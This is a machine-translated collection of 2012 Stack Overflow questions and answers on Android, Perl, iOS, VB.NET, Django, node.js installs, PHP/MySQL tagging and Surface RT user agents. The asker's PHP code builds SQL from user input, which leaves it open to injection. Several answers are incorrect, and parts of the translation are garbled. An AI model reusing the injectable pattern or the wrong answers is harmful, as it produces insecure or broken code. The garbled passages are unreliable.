super.onCreate(savedInstanceState);

        setContentView(R.layout.activity_homepage);

        Spinner spinner=(Spinner)findViewById(R.id.spinner1); 
```

XML

```
<RelativeLayout xmlns:android="schemas.android.com/apk/res/android"; 
        xmlns:tools="schemas.android.com/tools"; 
        android:layout_width="match_parent" 
        android:layout_height="match_parent" > 

       <Spinner android:id="@+id/spinner1" 
                android:layout_width="wrap_content" 
                android:layout_height="wrap_content" 
                android:layout_alignParentTop="true" 
                android:layout_centerHorizontal="true" /> 

</RelativeLayout> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T20:40:40.047

假设您有正确的 XML 布局。尝试清理您的项目（又名 recreate `gen`）。

项目-> 清洁-> 好的。之后，刷新您的项目以重新创建`R.java`. 可能会帮助你。

另一个原因可能是`R.java`文件路径错误

有时您根本看不到任何导入`R`。

所以手动添加：`import [yourpackage].R`

例如：`import com.demo.agnt.R`

`import android.R`或替换旧的：例如`import [yourpackage].R`

# perl - 在 Perl 的子例程中访问全局哈希

> ID：13076804
> 
> 赞同：1
> 
> 时间：2012-10-25T20:33:29.993
> 
> 标签：perl, hash, global-variables, subroutine

我创建了一个全局哈希，当我尝试从 Perl 子例程中访问该哈希时，它无法访问它。

我已将其声明为：

```
`%HASH = ();` 
```

并尝试在子程序中访问它：

```
$HASH{$key} = $value; 
```

难道我做错了什么？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-10-25T20:39:25.987

**在这里工作正常：**

```
#!/usr/bin/env perl

use strict;
use warnings;
use feature 'say';

our %truth = (); # "global" truth: lexical name
                 # for the package variable %main::truth

sub add_to_truth {
    my ($thing, $value) = @_;
    $truth{$thing} = $value;
}

add_to_truth(answer => 42);
say $truth{answer}; 
```

**输出**：

```
42 
```

请注意，在[严格](http://p3rl.org/strict)的情况下，您必须使用它们的包名称（在这种情况下）完全限定您的“全局”变量，`%main::truth`或者使用[**我们的**](http://p3rl.org/our). 今天没有限制（和警告）的编程*不是一件好事*™。事实上，激活它们会告诉你一些有用的东西。

# ios - NSJSONSerialization 适用于 iOS6 但不适用于 iOS5.1

> ID：13076808
> 
> 赞同：2
> 
> 时间：2012-10-25T20:33:35.110
> 
> 标签：ios, nsjsonserialization, ios5

我正在努力将 iOS5.1 兼容性恢复到我发布的当前需要 6.0 的应用程序。

此代码在 6.0 下完美运行，但在 5.1 下运行时，解析返回 null 对象，并在解析完全相同的 JSON 结果时返回错误。

我尝试弱链接基础框架

jsonError 是 -

`Error Domain=NSCocoaErrorDomain Code=3840 "The operation couldn’t be completed. (Cocoa error 3840.)" (Duplicate key for object around character 8.) UserInfo=0x11d58530 {NSDebugDescription=Duplicate key for object around character 8.}`

我已经验证了我的 JSON 集，并且在字符 8 处只有一个对象类型实例，字符 8 只是一个冒号：

```
{"site":{ 
```

这是代码...

```
NSData *responseData = [request responseData];
NSError *jsonError;
NSDictionary *responseDict = [NSJSONSerialization JSONObjectWithData:responseData options:NSJSONReadingMutableContainers error:&jsonError];

if ((responseData == nil) || (responseDict == nil)) {
   // I only get here when running on 5.1            
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T09:59:44.793

为 JSONSerialization 尝试不同的阅读选项？

```
NSJSONReadingAllowFragments 
```

这就是我用于我的项目的 iOS 6 版本的内容

# .net - 保存到用户“我的文档”中的文件夹

> ID：13076811
> 
> 赞同：8
> 
> 时间：2012-10-25T20:33:51.003
> 
> 标签：.net, vb.net

当我为我的应用程序创建安装程序时，我将在他们的“我的文档”中创建一个文件夹，该文件夹将用于将我的应用程序中的文件保存到其中。

我想让我的应用程序在保存文件和打开文件对话框打开时自动拉出这个目录。现在我的问题是，我需要使用什么字符串来访问他们“我的文档”中的文件夹？

我知道要让他们的文档目录是这样的：

```
Dim dir as String  
dir = System.Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) 
```

但是我的文档中的文件夹怎么样？例如我的文档/有史以来最酷的应用程序文件。该项目位于 VB.net 中。

提前致谢。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-10-25T20:37:46.883

看看`Path.Combine`。

```
dir = Path.Combine(dir, "Coolest Application Ever Files") 
```

在您尝试在那里写入文件之前确保它存在。

```
If Not Directory.Exists(dir) Then
  Directory.Create(dir)
End If 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2015-04-29T10:32:49.033

```
Dim filepath As String
filepath= IO.Path.Combine(My.Computer.FileSystem.SpecialDirectories.MyDocuments, "test.txt") 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-10-25T20:40:00.343

好吧，如果您在“我的文档”文件夹中创建文件夹，您是否可以假设您已经知道该文件夹的名称？所以不会：

```
dir = System.Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments & "\Your_Folder_Title\") 
```

工作？

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-25T20:39:20.533

只需将您要查找的文件夹附加到 MyDocuments 特殊文件夹

```
dir = System.Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments & "/Coolest Application Ever Files") 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-06-23T12:34:00.400

使用此行获取文件夹到您的文档。

```
Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "YourAppFolder") 
```

# ruby - Perl 在 Ruby %x{} 中未询问时替换插入垃圾

> ID：13076815
> 
> 赞同：1
> 
> 时间：2012-10-25T20:34:02.080
> 
> 标签：ruby, perl

所以我正在运行这一个班轮：

```
 perl -i -pe 's|[^\d\n]||g' country-ids.txt 
```

要替换文件中的文本，如下所示：

```
# encoding: utf-8
files_to_change = ["db_owners.txt", "db_vessels.txt"]
files_to_change.each do |file|
    text = File.read(file)
,"1")
,"1")
,"2")
,"2")
,"3") 
```

我的目标是剥离所有非数字字符的每一行，同时将这些行保留在其原始位置。

我得到的不是我想要的结果：

```
d
dd
d
d
<blank space> 
```

不知道发生了什么。我保留新行的原因是因为我上次在“查找”字符类中没有换行符的情况下运行它时，我得到的只是一个非常非常长的数字行。

如果有任何区别，我会使用 %x{command} 在 .rb 脚本中运行它。

编辑：

这是整个脚本。仍然遇到同样的问题。不知道为什么。

```
%x{cut -f 2 -d/ script-substitute-countries-with-id.rb > countries2.txt}
%x{cut -f 2 db_vessels.txt > countries.txt}
%x{cut -f 3 -d/ script-substitute-countries-with-id.rb > country-ids.txt}
%x{perl -i -pe 's:[^\d]::g' country-ids.txt}
%x{join countries2.txt country-ids.txt > countries2.txt.tmp}
%x{mv countries2.txt.tmp countries2.txt}
%x{cat countries.txt countries2.txt > countries.txt}
%x{uniq countries.txt > countries.txt.tmp}
%x{mv countries.txt.tmp countries.txt} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-25T20:46:32.837

Ruby 的`%x{}`运算符应用了类似双引号的语义，这意味着反斜杠是特殊的。将 perl 代码更改为：（在`'s|[^\\d\\n]||g'`每个位置使用 2 个反斜杠 1）它应该可以工作。

# c++ - 如何使用 C++ 编辑可执行文件中的资源？

> ID：13076816
> 
> 赞同：2
> 
> 时间：2012-10-25T20:34:04.603
> 
> 标签：c++, resources, executable, portable-executable

我需要一种方法来编辑已编译可执行文件的资源（确切地说是字符串表），并且我需要在 C++ 中进行。

任何人都可以提供有关如何执行此操作的任何指导/示例代码吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T21:01:13.373

从它开始`LoadLibrary()`并加载一个可执行文件（您要编辑的那个）然后`FindResource()`根据`UpdateResource()`需要。

在这里阅读所有相关信息：

[PE 格式资源函数](http://msdn.microsoft.com/en-us/library/windows/desktop/ff468902(v=vs.85).aspx)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-25T20:49:10.360

如果你在 Linux 或 OS X 上，总有“strings”命令会打印出可执行文件中的所有静态字符串。将其与“objdump”之类的内容和一些知识与十六进制编辑器相结合，您也许可以拼凑出一些东西。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-25T20:41:52.653

我不知道这是否可能，一旦你有一个编译的可执行文件并且它只是机器代码，就没有一种具体的方式来理解如何解释它（因此找到/编辑你正在寻找的资源)...即，一旦您拥有可执行文件，您就无法确定一个单词是汇编中的指令还是只是表示汇编中的数字、标签等的单词...

我所知道的。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-25T21:05:12.060

您可以查看Matt Pietrek的[PeDump的良好旧参考和源代码。](http://www.wheaty.net/pedump.zip)他确实在 C++ 中处理（只读）PE 文件的资源。也许它会激励你解决你的问题......

# tfs - 检测合并标准

> ID：13076817
> 
> 赞同：1
> 
> 时间：2012-10-25T20:34:05.663
> 
> 标签：tfs, merge

考虑以下场景（**按时间**顺序）：

1.  Bob 签出 source.cs
2.  杰克检查 source.cs
3.  Jack 签入 source.cs
4.  Bob 签入 source.cs

需要执行*合并*，因为 Bob 的版本**不是**从最新版本创建的。

使用什么标准`TFS 2010`来确定是否需要合并？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T20:47:28.777

Bob 的版本将从最新版本创建。

在第 4 步中，在执行“获取最新”之前，不允许 Bob 签入 source.cs。在 TFS 2010 中，当您对具有 Pending Changes 的文件执行“获取最新”并且有更改要从服务器获取时，它会将其检测为冲突并需要解决方案。

如果本地更改和服务器更改足够不同，例如 Jack 编辑第 10 行，而 Bob 编辑第 110 行，则“自动合并”按钮将可用，作为冲突解决方案。如果 Jack 和 Bob 都更改了第 10 行，那么您必须自己处理冲突并使用“合并工具”来决定要保留哪些更改。

这是一个愚蠢的过程，其他现代 SCM 软件将在适用时自动合并，而无需您的输入。但我想这确实意味着你可以决定它是否应该是自动合并。

[Brian Harry 在这里](http://blogs.msdn.com/b/bharry/archive/2011/08/31/merge-enhancements-in-tfs-11.aspx)更详细地介绍**了**TFS 2012 中所做的改进，这意味着您将花费更少的时间来解决冲突。

# logging - 实时聚合和分析来自多个服务器的日志

> ID：13076818
> 
> 赞同：0
> 
> 时间：2012-10-25T20:34:06.887
> 
> 标签：logging, analytics, distributed-computing

如果我想实时分析数十亿行日志以找出前 k 个用户模式，并且由于数据量巨大，有多个服务器满足用户请求并在各自的机器上记录数据，如何我应该去做吗？

我不是在寻找一个相同的开源实现来帮助我完成上述任务，而是一种从每台机器聚合日志的方法（如果算法中可以进行本地聚合，则可能不一定需要）并做对全集进行分析，根据一定的约束条件得到前几条日志。

我应该使用什么数据结构，应该采用什么方法？请注意，这些日志会不断生成，我们希望实时更新我们的结果。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T20:42:56.337

> 我应该使用什么数据结构，应该采用什么方法？

MapReduce 传统上用于此类任务，请尝试[Hadoop](http://hadoop.apache.org/)。[分布式`grep`](http://wiki.apache.org/hadoop/Grep)是一个学校示例，许多其他人正在使用它进行日志管理。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-29T19:29:22.933

我就是这样做的[https://stackoverflow.com/a/6484592/760401](https://stackoverflow.com/a/6484592/760401)
我必须说我从来没有为如此大量的数据做过它，但是 :)，Jabber/XMPP 和 CouchDB 都以他们的扩展能力。

# soundcloud - SoundCloud API：是否可以自动生成上传和嵌入代码？

> ID：13076819
> 
> 赞同：5
> 
> 时间：2012-10-25T20:34:09.673
> 
> 标签：soundcloud

是否可以通过 SoundCloud API 完成这 3 步过程？

1.  以编程方式上传曲目
2.  （也以编程方式）立即生成并接收该轨道的嵌入代码
3.  （ugggh ...也以编程方式）使用该嵌入代码将该轨道嵌入到我们自己网站上的动态生成的网页上，该网页将专用于该剪辑

如果要求一个简单的“是/否”答案使这个问题更有可能得到回答......或者不太可能被“关闭”......我会对这样的答案感到非常满意。:-)

干杯！

柯克

# django - django用q个对象动态过滤

> ID：13076822
> 
> 赞同：42
> 
> 时间：2012-10-25T20:34:28.693
> 
> 标签：django, django-models, django-q

我正在尝试根据用户输入标签查询数据库。标签的数量可以是 0-5，所以我需要动态创建查询。

所以我有一个标签列表，tag_list，我想查询数据库：

```
design_list = Design.objects.filter(Q(tags__tag__contains = "tag1") and Q(tags__tag__contains = "tag2") and etc. etc. ) 
```

如何创建此功能？

* * *

## 回答 #1

> 赞同：104
> 
> 时间：2012-10-25T20:40:45.910

您需要遍历 tag_list 并为每个应用一个过滤器。

```
tag_list = ['tag1', 'tag2', 'tag3']
base_qs = Design.objects.all()
for t in tag_list:
    base_qs = base_qs.filter(tags__tag__contains=t) 
```

这将为您提供匹配*所有*标签的结果，如您的示例所示`and`。如果实际上您需要`or`，您可能需要 Q 对象。

**编辑：**我想我现在有你要找的东西。

```
tags = ['tag1', 'tag2', 'tag3']
q_objects = Q() # Create an empty Q object to start with
for t in tags:
    q_objects |= Q(tags__tag__contains=t) # 'or' the Q objects together

designs = Design.objects.filter(q_objects) 
```

我对此进行了测试，它似乎工作得很好。

**编辑 2：**感谢 Freenode 上#django 中的 kezabelle 最初的想法。

* * *

## 回答 #2

> 赞同：27
> 
> 时间：2018-06-09T14:43:44.793

你可以这样使用：

```
my_dict = {'field_1': 1, 'field_2': 2, 'field_3': 3, ...}  # Your dict with fields
or_condition = Q()
for key, value in my_dict.items():
    or_condition.add(Q(**{key: value}), Q.OR)

query_set = MyModel.objects.filter(or_condition) 
```

通过这种方式，您可以使用动态生成的字段名称。也可以`Q.AND`用于`AND`条件。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-10-25T20:41:19.067

只需先准备一个标签列表，查询如下：

```
tags = ['tag1', 'tag2',...]
design_list = Design.objects.filter(tags__tag__contains__in = tags) 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2020-07-29T14:34:22.153

您可能需要添加 AND 和 OR 条件

```
 query = (Q(fild1='ENABLE'))
    # Filter by list
    query.add(Q(fild2__in=[p.code for p in Objects.field.all()]), Q.AND)

    # filter OR
    q_objects = Q(field3='9999999')
    for x in myList:
        q_objects.add(Q(field3=x.code), Q.OR)

    query.add(q_objects, Q.AND) 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2021-03-02T16:31:39.540

使用减少：

```
from functools import reduce
design_list = Design.objects.filter(reduce(lambda q1,q2: q1 & q2,
                                           [Q(tags__tag__contains=t)
                                            for t in tag_list])) 
```

# node.js - 回滚 node.js 安装在 Windows 7 x64 PC 上

> ID：13076825
> 
> 赞同：10
> 
> 时间：2012-10-25T20:34:43.510
> 
> 标签：node.js, windows-7, 64-bit

一段时间以来，我一直试图在我的家用 PC 上安装 node.js，但没有成功。在过去的几个月中，我尝试了不同的版本，无论我尝试什么，它都会在“创建快捷方式”处开始回滚安装，并且无法安装。我为任何想要查看它并尝试帮助我解决问题的人创建了一个安装日志。谢谢！

[https://dl.dropbox.com/u/177486/MSIf99e3.LOG](https://dl.dropbox.com/u/177486/MSIf99e3.LOG)

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2017-01-20T12:37:46.693

我遇到了同样的问题，我已经解决了我的问题。**我只是在安装 node.js**期间**需要**时标记`performance counter`为安装 ****[![在此处输入图像描述](../Images/25309c6c490f7fab992a358aa87e4ca0.png)](https://i.stack.imgur.com/NtoUT.png)****

 ***** * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-10-25T21:08:36.047

Windows Installer 报告它已安装，即使它已被回滚。

跑`msiexec /x {29552F29-7FE9-441F-BC56-E6B591587A59}`

上面的 guid 是`ProductCode`您的日志中的值。

如果这不起作用并且您可以从 Windows SDK 访问 Orca.exe，则您可以修改`WixSchedInternetShortcuts`为错误条件并成功安装。为此，请安装 Orca，然后右键单击 node.js msi 文件并选择“使用 Orca 编辑”，然后：

1.  `InstallExecuteSequence`在左侧的“表格”下突出显示。
2.  `WixSchedInternetShortcuts`在右边找到
3.  双击条件单元格并更改`VersionNT > 400`为`0`
4.  转到文件 -> 保存
5.  再次运行安装程序

安装此版本后，您应该能够通过添加/删除程序将其彻底删除，并安装另一个版本，而无需修改 msi 文件。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2015-01-25T00:51:22.943

我对 v0.10.35 有同样的问题。（2015 年 1 月 23 日）

我所要做的就是禁用自定义安装窗格中的快捷方式，它工作正常：

![禁用快捷方式选项的自定义图像窗格](../Images/5ff0dfb55be53553eecf1de8f55501ce.png)

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2017-04-15T14:28:02.947

我的解决方案您必须单独安装每个项目。

1.  Npm 包管理器
2.  添加到路径
3.  在线文档...
4.  Nodejs 运行时/Performans 计数器
5.  （重要）nodejs 运行时/事件跟踪（etw）（选择“将需要安装功能”
6.  重新启动计算机

[上次安装视图](https://i.stack.imgur.com/hfjSD.png)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2014-11-03T00:16:12.427

**以上所有方法均无效。**

> -以管理员身份运行 msiexec
> 
> -msiexec /x ...
> 
> -修改 WixSchedInternetShortcuts
> 
> - 删除行 WixSchedInternetShortcuts
> 
> -即使这样：[在安装过程中删除创建在线文档快捷方式的选项](https://stackoverflow.com/a/16232615)

[可以手动修复它](https://stackoverflow.com/a/12567371/861273)，您可以阅读[此帮助](http://www.thewindowsclub.com/disable-rollback-feature-windows)以安装产品，然后[将](http://www.computerhope.com/issues/ch000549.htm) `C:\Program Files\nodejs`路径添加到 Windows 环境变量。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2017-07-09T14:47:57.620

```
msiexec /i node.msi /qn+ ADDLOCAL=ALL REMOVE=NodePerfCtrSupport,NodeEtwSupport 
```

这可能会有所帮助

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2016-08-04T10:44:58.340

打开命令提示符并粘贴以下命令

> reg 查询“HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Perflib_V2Providers{793c9b44-3d6b-4f57-b5d7-4ff80adcf9a2}”/s
> 
> reg 查询“HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Perflib_V2Providers{1e2e15d7-3760-470e-8699-b9db5248edd5}”/s

如果您得到命令的结果，请转到注册表项并删除该项。现在尝试再次安装它。您现在应该可以安装它了。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2014-04-27T06:47:20.930

需要注意的一点（我很难学会）：即使在使用 Orca 编辑了安装程序之后，也不要尝试取消选中安装程序中创建快捷方式的复选框，让它们保持选中状态，否则它将失败并出现同样的错误信息。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2013-02-15T10:03:38.620

有同样的问题。Jim Schubert 提供的解决方案 1 没有解决它。然后我使用 Orca 编辑安装文件。改变`VersionNT`条件也没有为我解决问题。然后我只是从中删除了行`WixSchedInternetShortcuts`并成功安装。我想它在编写快捷方式时遇到了一些问题。我之前也尝试过以管理员身份运行 msiexec（“/a”选项），但这并没有解决它......

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2018-06-11T12:25:30.000

*   检查您的计算机中是否安装了 Avast Antivirus。
*   如果是关闭防护罩并尝试安装 nodejs

现在它工作得很好......

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2016-11-06T14:03:35.770

它也发生在我身上，我从安装中删除了几乎所有内容并完成了安装。之后，我再次运行安装并一一添加，直到全部安装完毕。

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2018-06-06T00:21:01.900

您始终可以使用巧克力安装：

[https://chocolatey.org/packages/nodejs.install/8.11.1](https://chocolatey.org/packages/nodejs.install/8.11.1)

```
choco install nodejs.install --version 8.11.1 
```****

# php - 如何使用 Jquery 获取输入自定义值并将其传递给来自多选条件的变量

> ID：13076834
> 
> 赞同：0
> 
> 时间：2012-10-25T20:35:20.817
> 
> 标签：php, javascript, jquery, html, jquery-ui

我有这个带有多选块的表单，我试图在点击时获取每个块标准的值，以便我可以将其发送到数据库，但是每次我点击一个块时，我的脚本都会获取所有的值，任何想法?

我在这里创建了一个 jsFiddle：http: [//jsfiddle.net/creativestudio/Hqbmk/4/](http://jsfiddle.net/creativestudio/Hqbmk/4/)

```
<form action="" method="post" id="postingFeedback">

            <!-- .votes-list -->
            <ul class="vote-list">
                <li class="vote" name="vote1" value="A-value1">
                </li>
                <li class="vote" name="vote1" value="A-value2">
                </li>
                <li class="vote" name="vote1" value="A-value3">
                </li>
                <li class="vote" name="vote1" value="A-value4">
                </li>
                <input name="smileVote" class="is-hidden" data-role="none" value="" />
            </ul><!-- / .votes-list -->

<div class="clear"></div>

            <!-- .votes-list -->
            <ul class="vote-list">
                <li class="vote" name="vote2" value="B-value1">
                </li>
                <li class="vote" name="vote2" value="B-value2">
                </li>
                <li class="vote" name="vote2" value="B-value3">
                </li>
                <li class="vote" name="vote2" value="B-value4">
                </li>
                <input name="smileVote" class="is-hidden" data-role="none" value="" />
            </ul><!-- / .votes-list -->
            <div class="clear"></div>

<div class="clear"></div>

            <!-- .votes-list -->
            <ul class="vote-list">
                <li class="vote" name="vote3" value="C-value1">
                </li>
                <li class="vote" name="vote3" value="C-value2">
                </li>
                <li class="vote" name="vote3" value="C-value3">
                </li>
                <li class="vote" name="vote3" value="C-value4">
                </li>
                <input name="smileVote" class="is-hidden" data-role="none" value="" />
            </ul><!-- / .votes-list -->
            <div class="clear"></div>

<div class="clear"></div>

            <!-- .votes-list -->
            <ul class="vote-list">
                <li class="vote" name="vote3" value="D-value1">
                </li>
                <li class="vote" name="vote3" value="D-value2">
                </li>
                <li class="vote" name="vote3" value="D-value3">
                </li>
                <li class="vote" name="vote3" value="D-value4">
                </li>
                <input name="smileVote" class="is-hidden" data-role="none" value="" />
            </ul><!-- / .votes-list -->
            <div class="clear"></div>

<div class="clear"></div>

            <!-- .votes-list -->
            <ul class="vote-list">
                <li class="vote" name="vote4" value="D-value1">
                </li>
                <li class="vote" name="vote4" value="D-value2">
                </li>
                <li class="vote" name="vote4" value="D-value3">
                </li>
                <li class="vote" name="vote4" value="D-value4">
                </li>
                <input name="smileVote" class="is-hidden" data-role="none" value="" />
            </ul><!-- / .votes-list -->
            <div class="clear"></div>

<div class="clear"></div>

            <!-- .votes-list -->
            <ul class="vote-list">
                   <li class="vote" name="vote5" value="E-value1">
                </li>
                <li class="vote" name="vote5" value="E-value2">
                </li>
                <li class="vote" name="vote5" value="E-value3">
                </li>
                <li class="vote" name="vote5" value="E-value4">
                </li>
                <input name="smileVote" class="is-hidden" data-role="none" value="" />
            </ul><!-- / .votes-list -->
            <div class="clear"></div>

</form> 
```

这是我的 JS：

```
function getValues(){    
    $('#postingFeedback li').on('click', function(event){        
           var $clickedValue = $(this).val($(this).attr("value")); // Retreive "value"
           $(this).siblings('input[name="smileVote"]').val($clickedValue); // Plug smile value into input for database POSTS
    });
}

getValues();
​ 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T20:47:41.467

`value`是一个保留属性，它不打算用于`li`你想要做的事情。将其重命名为其他名称，例如`vote`：

```
<li class="vote" name="vote1" vote="A-value1"> 
```

然后通过直接访问属性来获取值：

```
$('#postingFeedback li').on('click', function(event){
    $(this).siblings('input[name="smileVote"]').val($(this).attr('vote')); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T20:39:10.983

为每个输入赋予不同的名称。表单以键值对形式发送数据，其中以名称为键。由于所有输入框都具有相同的名称，因此只有一个键值对。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-25T20:44:11.853

尝试使用`.serializeArray()`

```
$('[type="submit"]').on('click' , function(e) {

    e.preventDefault();

    var  a = $(':input').serializeArray().get();
    console.log(a);
}); 
```

您可以使用**var a**将其发送到您的数据库

**[检查小提琴](http://jsfiddle.net/sushanth009/Hqbmk/5/)**

# php - SQL 插入中的标签不重复 (Toxi)

> ID：13076837
> 
> 赞同：2
> 
> 时间：2012-10-25T20:35:48.423
> 
> 标签：php, mysql, sql

我的用户帐户表单的一部分询问人们他们的兴趣（$tags），这些兴趣存储在 MySQL 中，每个 $tag 用逗号分隔。

每个 $tag 都有一个 id，然后一个单独的表将用户的唯一 id 与 $tag id 链接起来。

这一切都很好 - 绝对理想但我不想重复标签数千次。例如，很多人会输入“gym”作为兴趣。继续添加一个具有唯一 id 的新“gym”$tag 似乎是一种浪费，而一旦将其作为 $tag 输入一次，该 $tag id 就可以与碰巧也输入 ' 的任何新用户 id 相关联健身房'。那有意义吗？

我当前的代码如下（$tags 来自经过清理的 $_POST），并插入到两个表中：

1.tag_id 有一个 $tag 的标签字段，每个都生成一个唯一的 id 2.tag_relation 将用户 id 与生成的标签 id 匹配。

```
$tags = strtoupper($tags);$tags= preg_split('/\,/', $tags);
foreach ($tags as $ind) 

{
$sql = "INSERT INTO tag_id (tag) VALUES('$ind')";
$result=mysql_query($sql);
}

foreach ($tags as $ids) 
{
$sql = "SELECT * FROM tag_id WHERE tag = '$ids'";
$result=mysql_query($sql);
$idinfo=mysql_fetch_assoc($result);
$id=$idinfo['t_id'];

$sql = "INSERT INTO tag_relation (user_id, tag_id) VALUES ('$user_id', '$id')";
$result=mysql_query($sql);
} 
```

所以我的问题是，是否可以将上述内容修改为不在 tag_id 表中重复 $tags，而是将该表中现有的 $tags 与 tag_relation 中的用户 ID 匹配？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T20:39:00.640

您应该在列上创建`UNIQUE`索引。`tag`然后，您可以使用[`INSERT IGNORE`](http://dev.mysql.com/doc/refman/5.5/en/insert.html)插入新标签，但如果重复键警告已存在于表中，则取消它。

```
CREATE UNIQUE INDEX idx_tag_unique ON tag_id (tag); 
```

插入标签时：

```
INSERT IGNORE INTO tag_id (tag) VALUES ('$ind'); 
```

当然，在您这样做之前，您需要清除现有的重复标签值表。但是，如果值已经存在，则无法使用`LAST_INSERT_ID()`。`INSERT IGNORE`因此，为了可靠地获得`tag_id`它，您需要像当前一样继续查询它。

顺便说一句 -`$tags`如果它们来自用户输入，我们假设标签值已经针对 SQL 注入进行了转义。如果没有，请务必`mysql_real_escape_string()`在循环中调用它们。并考虑迁移到比`mysql_*()`MySQLi 或 PDO 等支持参数化查询的函数更新的 API。

# windows-8 - Surface rt 的用户代理字符串是什么？

> ID：13076839
> 
> 赞同：25
> 
> 时间：2012-10-25T20:35:58.393
> 
> 标签：windows-8, internet-explorer-10, user-agent, windows-rt

我正在尝试确定表面 RT 的用户代理字符串以进行测试。

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2012-10-25T20:39:38.673

只需做一些谷歌搜索，您就会找到答案。

[Internet Explorer 10 用户代理字符串](http://msdn.microsoft.com/en-us/library/ie/hh920767%28v=vs.85%29.aspx)

> **Windows RT 上的 Internet Explorer 10：**
> 
> Mozilla/5.0（兼容；MSIE 10.0；Windows NT 6.2；ARM；Trident/6.0）

*在下面评论后更新*

上面的链接还指出：

> **识别支持触摸的系统**
> *Internet Explorer 10 引入了“触摸”UA 字符串标记。如果此令牌出现在 UA 字符串的末尾，则计算机具有触摸功能，并且正在运行 Windows 8（或更高版本）。此 UA 字符串将在运行 Windows 8 的支持触控的系统上传输。*
> **注意** *Windows 7 上的 Internet Explorer 10 永远不会报告带有“Touch”令牌的 UA 字符串。*
> 
> **Windows RT 上启用触控的 Internet Explorer 10：**
> 
> Mozilla/5.0（兼容；MSIE 10.0；Windows NT 6.2；ARM；Trident/6.0；Touch）

* * *

**Internet Explorer 11 更新**

[用户代理字符串更改](http://msdn.microsoft.com/en-us/library/ie/hh869301%28v=vs.85%29.aspx)

以下是针对 Windows 8.1 上的 Internet Explorer 11 的报告：

```
Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko 
```

这是 Windows 7 上 Internet Explorer 11 的字符串：

```
Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko 
```

如果您将这些值与早期版本的 Internet Explorer 报告的值进行比较，您会发现以下变化：

*   兼容（“compatible”）和浏览器（“MSIE”）令牌已被删除。
*   添加了“like Gecko”标记（为了与其他浏览器保持一致）。
*   浏览器的版本现在由新的修订 (“rv”) 标记报告。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-14T14:41:45.853

我昨天（2012 年 11 月 13 日）去了微软零售店，并使用 IE在 Metro 和 Desktop 模式下浏览到[http://whatsmyuseragent.com/ 。](http://whatsmyuseragent.com/)

这是两种情况下给出的用户代理：

```
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; ARM; Trident/6.0; Touch) 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2013-03-14T14:03:27.470

对于那些感兴趣的人。这是 Surface Pro (128Gb) 的用户代理字符串：

```
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Win64; x64; Trident/6.0; Touch) 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-11-06T23:19:16.990

其实大家都错了。在 Metro 模式中出现的实际用户代理是

> Mozilla/4.0（兼容；msie 7.0；windows nt 6.2；arm；trident/6.0；touch；.net4.0e；.net4.0c；tablet PC 2.0；版本）。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2015-02-11T22:45:44.507

这是我访问 whatsmyuseragent 网站时得到的：

```
Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; rv:11.0) like Gecko 
```

希望这可以帮助。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-10-25T20:47:22.870

Surface RT 将仅运行 IE 10。用户代理字符串为
`Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; ARM; Trident/6.0)`

（来源：此[MSDN 博客条目](http://blogs.msdn.com/b/ie/archive/2012/07/12/ie10-user-agent-string-update.aspx)）
此类信息通常在底层浏览器/机器交付之前很早就发布，因为 Web 浏览器制造商希望看到大多数网站都支持的新浏览器。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2018-10-04T12:33:50.867

设备的用户代理 -

